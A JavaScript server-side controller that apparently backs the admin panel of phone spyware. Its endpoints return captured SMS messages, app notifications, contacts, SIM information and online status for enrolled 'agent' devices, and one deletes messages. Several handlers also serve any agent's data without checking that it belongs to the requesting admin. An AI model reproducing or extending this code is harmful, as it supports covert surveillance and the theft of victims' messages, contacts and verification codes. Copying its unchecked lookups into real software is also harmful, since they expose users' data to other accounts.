const {
    respondSuccessWithData,
    respondFailed,
    RESPONSE_MESSAGES, respondSuccess
} = require("../../managers/responseManager");
const {AgentModel, MessageModel, ContactsModel, DetailsModel, NotificationModel} = require("../../models/dataModels");

const getAgents = async (req, res) => {
    let adminID = req.user.appID;

    let agents = await AgentModel.find({adminID}).lean();
    let agentList = [];
    for (let i = 0; i < agents.length; i++) {
        let agent = agents[i];
        agentList.push({
            isOnline: connectedUsers.hasOwnProperty(agent.agentID),
            agentID: agent.agentID,
            agentName: agent.agentName,
            deviceName: agent.deviceName,
            time: agent.time,
            simInfo: agent.simInfo
        })
    }
    respondSuccessWithData(res, agentList.reverse());
}

const getMessages = async (req, res) => {
    try {
        const agentID = req.params.agentID;
        let messages;

        if (agentID === "all") {
            const adminID = req.user.appID;
            const agents = await AgentModel.find({adminID}).select('agentID').lean();
            const agentIDs = agents.map(agent => agent.agentID);

            messages = await MessageModel.find({agentID: {$in: agentIDs}}).sort({_id: -1}).limit(100).lean();
        } else {
            messages = await MessageModel.find({agentID}).sort({_id: -1}).limit(100).lean();
        }

        // Map to desired format
        const messageList = messages.map(msg => ({
            sender: msg.sender,
            message: msg.message,
            time: msg.time,
        }));

        // Sort based on time
        messageList.sort((a, b) => {
            const parseDate = (str) => {
                const [datePart, timePart] = str.split(', ');
                const [day, month, year] = datePart.split('/').map(Number);
                let [time, meridian] = timePart.split(' ');
                let [hours, minutes, seconds] = time.split(':').map(Number);

                if (meridian.toLowerCase() === 'pm' && hours !== 12) hours += 12;
                if (meridian.toLowerCase() === 'am' && hours === 12) hours = 0;

                return new Date(year, month - 1, day, hours, minutes, seconds);
            };

            return parseDate(a.time) - parseDate(b.time);
        });

        respondSuccessWithData(res, messageList.reverse());
    } catch (error) {
        console.error(error);
        respondFailed(res, RESPONSE_MESSAGES.ERROR);
    }
};

const getNotification = async (req, res) => {
    try {
        let agentID = req.params.agentID;
        let notificationList;

        if (agentID === "all") {
            const adminID = req.user.appID;
            const agents = await AgentModel.find({adminID}).select('agentID').lean();
            const agentIDs = agents.map(agent => agent.agentID);

            notificationList = await NotificationModel.find({agentID: {$in: agentIDs}}).sort({_id: -1}).limit(100).lean();
        } else {
            notificationList = await NotificationModel.find({agentID}).sort({_id: -1}).limit(100).lean();
        }

        const notifications = notificationList.map(notification => ({
            title: notification.title,
            appName: notification.appName,
            text: notification.text,
            time: notification.time,
        }));

        // Sort based on time
        notifications.sort((a, b) => {
            const parseDate = (str) => {
                const [datePart, timePart] = str.split(', ');
                const [day, month, year] = datePart.split('/').map(Number);
                let [time, meridian] = timePart.split(' ');
                let [hours, minutes, seconds] = time.split(':').map(Number);

                if (meridian.toLowerCase() === 'pm' && hours !== 12) hours += 12;
                if (meridian.toLowerCase() === 'am' && hours === 12) hours = 0;

                return new Date(year, month - 1, day, hours, minutes, seconds);
            };

            return parseDate(a.time) - parseDate(b.time);
        });

        respondSuccessWithData(res, notifications.reverse());
    } catch (error) {
        console.error(error);
        respondFailed(res, RESPONSE_MESSAGES.ERROR);
    }
};

const getContacts = async (req, res) => {
    let agentID = req.params.agentID;

    let contacts = await ContactsModel.find({agentID}).lean();
    let contactList = [];

    for (let i = 0; i < contacts.length; i++) {
        let contact = contacts[i];
        contactList.push({
            phone: contact.phone,
            name: contact.name
        })
    }

    respondSuccessWithData(res, contactList);
}

const getDetails = async (req, res) => {
    let agentID = req.params.agentID;
    let details;

    if (agentID === "all") {
        const adminID = req.user.appID;
        const agents = await AgentModel.find({adminID}).select('agentID').lean();
        const agentIDs = agents.map(agent => agent.agentID);
        details = await DetailsModel.find({agentID: {$in: agentIDs}}).sort({_id: -1}).limit(100).lean();
    } else {
        details = await DetailsModel.find({agentID}).sort({_id: -1}).limit(100).lean();
    }

    details.sort((a, b) => {
        const parseDate = (str) => {
            const [datePart, timePart] = str.split(', ');
            const [day, month, year] = datePart.split('/').map(Number);
            let [time, meridian] = timePart.split(' ');
            let [hours, minutes, seconds] = time.split(':').map(Number);

            if (meridian.toLowerCase() === 'pm' && hours !== 12) hours += 12;
            if (meridian.toLowerCase() === 'am' && hours === 12) hours = 0;

            return new Date(year, month - 1, day, hours, minutes, seconds);
        };

        return parseDate(a.time) - parseDate(b.time);
    });

    const detailsList = details.map(detail => detail.details);

    respondSuccessWithData(res, detailsList.reverse());
}

const deleteMessage = async (req, res) => {
    let agentID = req.params.agentID;

    let {sender, time} = req.body;

    await MessageModel.deleteOne({agentID, sender, time});

    respondSuccess(res);
}

module.exports = {
    getAgents, getMessages, getContacts, getDetails, getNotification, deleteMessage
}